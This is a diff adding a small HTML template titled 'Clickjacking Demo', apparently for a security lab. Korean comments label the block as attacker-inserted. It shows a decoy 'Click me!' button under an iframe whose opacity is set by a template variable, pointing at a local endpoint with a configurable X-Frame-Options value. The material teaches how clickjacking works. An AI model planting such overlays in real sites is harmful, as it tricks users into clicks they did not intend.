@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Clickjacking Demo</title>
+</head>
+<body>
+    <h1>안녕하세요 회원님</h1>
+
+    <!-- 공격자가 삽입한 HTML 코드 -->
+    <div style="position: relative; z-index: 1;">
+        <button style="position: absolute; top: 20px; left: 20px;">Click me!</button>
+    </div>
+    <iframe style="position: absolute;width: 400px;height: 300px;opacity: {{ opacity }};z-index: 2;top: 20px;left: 20px;border: none;"
+            src="https://172.25.143.119:5555/clickme?x-frame-options={{ frame }}"></iframe>
+    <!-- 공격자가 삽입한 HTML 코드 -->
+</body>
+</html>
